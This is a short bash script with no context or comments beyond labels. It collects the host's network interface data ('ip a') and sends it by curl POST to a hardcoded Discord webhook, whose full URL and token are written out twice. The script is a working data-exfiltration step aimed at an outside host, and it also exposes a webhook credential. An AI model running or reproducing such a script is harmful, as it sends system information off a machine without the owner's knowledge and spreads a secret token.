#https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5

# Discord webhook URL
WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"

# Collect network data
NETWORK_DATA=$(ip a)

# Send data to Discord
curl -H "Content-Type: application/json" \
     -X POST \
     -d "{\"content\": \"Network Data:\n$NETWORK_DATA\"}" \
     $WEBHOOK_URL
